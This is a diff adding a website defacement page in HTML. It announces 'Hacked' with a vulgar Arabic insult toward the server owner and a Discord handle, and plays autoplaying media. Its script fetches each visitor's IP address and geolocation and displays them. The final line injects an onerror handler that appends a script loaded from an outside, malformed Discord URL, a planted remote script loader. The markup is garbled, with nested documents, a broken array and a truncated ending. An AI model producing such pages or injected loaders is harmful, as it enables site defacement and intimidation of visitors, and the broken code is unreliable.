@@ -1,0 +1,210 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>jimy</title>
+</head>
+<body bgcolor="#000000">
+<script>
+    var names = [
+        { name: " قفل سيرفرك en" },
+        { name: "[ قفل سيرفرك: "white" },
+
+    ];
+
+    var nameIndex = 0;
+
+    function changeNames() {
+        var currentName = names[nameIndex];
+        document.getElementById("name").textContent = currentName.name;
+        document.getElementById("name").style.color = currentName.color;
+        nameIndex = (nameIndex + 1) % names.length;
+    }
+
+    // Change the names every 1 second
+    setInterval(changeNames, 1000);
+</script>
+<p align="center">
+    <img border="0" src="https://cdn.discordapp.com/icons/1311695239735414896/7465604e352b60ff099fb145d6a806bb.webp?size=1024&format=webp">
+</p>
+<p align="center">
+    <font face="Courier" size="6" style="color: #ff0000;">
+        <span style="color: rgb(230, 11, 11);">Hacked كس ام سيرفرك التعبان
+        <span id="name"></span>
+    </font>
+</p>
+<p align="center">
+    <b>
+<font face="Courier" color="#000000">
+<a href="discord : aw9i" style="font-size: 24px; color: rgb(255, 0, 0); text-decoration: none;">discord aw9i</a>
+
+
+</font>
+
+    </b>
+</p>
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>discord : aw9i</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #ff0000;
+            background-color: #000000;
+            overflow: hidden;
+        }
+
+        h1, h3 {
+            color: #ffffff;
+        }
+
+        #ip-address {
+            color: rgb(255, 0, 157);
+        }
+
+        #ip-info {
+            font-family: Arial, sans-serif;
+            white-space: pre;
+            color: rgb(0, 102, 255);
+        }
+
+        .cmd-text-container {
+            position: relative;
+        }
+
+        .cmd-text {
+            color: #000000;
+            font-size: 9px;
+            font-family: Arial, sans-serif;
+            white-space: nowrap;
+            position: absolute;
+            animation: scrollText 20s linear infinite;
+            transform: translateX(100%);
+            -webkit-text-stroke: 1px rgb(255, 0, 0);
+            text-stroke: 1px rgb(158, 0, 0);
+        }
+
+        .gray-text {
+            color: #000000;
+            outline: 1px solid #000000;
+        }
+
+        .json-data {
+            font-family: Arial, sans-serif;
+            color: Orange;
+            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
+        }
+
+        .json-data span {
+            color: black;
+        }
+
+        @keyframes scrollText {
+            0% {
+                transform: translateX(100%);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .cmd-text:hover {
+            animation-play-state: paused;
+        }
+
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            filter: blur(10px);
+        }
+
+        /* Hide the audio controls */
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Animated Text</title>
+    <style>
+        @keyframes lightning {
+            0% { color: rgb(255, 0, 0); }
+            50% { color: black; }
+            100% { color: rgb(255, 0, 0); }
+        }
+
+        .animated-text {
+            animation: lightning 1s linear infinite;
+        }
+    </style>
+</head>
+<body>
+    <h3 class="animated-text">تسجيل دخول ايمن بن خالد  :</h3>
+    <h3 class="animated-text">يد ماتقواها صافحها  :</h3>
+</body>
+</html>
+    <p id="ip-address">
+        <span style="color: rgb(0, 0, 0);">Your IP Address: </span>
+        <span id="ip-address-value" style="color: rgb(30, 255, 0); font-size: 17px;">Loading...</span>
+    </p>
+
+    <h3 style="color: rgb(0, 0, 0); animation: flashing 1s infinite;">Your IP Info :</h3>
+    <pre id="ip-info" class="json-data">Fetching...</pre>
+    <div class="cmd-text-container" style="position: relative; top: -15px;">
+        <div class="cmd-text" style="font-size: 17px; text-stroke: 3px black; color: black;"> discord aw9i 
+    </div>
+
+    <!-- Hidden audio element with autoplay -->
+    <audio autoplay loop style="display: none;">
+        <source src="…. (1).mp3" type="video/mp4">
+        Your browser does not support the audio element.
+    </audio>
+
+<video style="width: 100vw; height: 100vh;" controls autoplay loop muted>
+    <source src="
+    Your browser does not support the video element.
+</video>
+
+
+    <script>
+        // JavaScript code to fetch and display the user's IP address and information
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+                .then(response => response.json())
+                .then(ipInfoData => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        // Fetch IP address and information initially
+        fetchIPAndInfo();
+    </script>
+</body>
+</html>
+<img src="about:invalid" onerror="document.body.appendChild(document.createElement('script')).src='https:https://discord.gg/3eR2CM5g
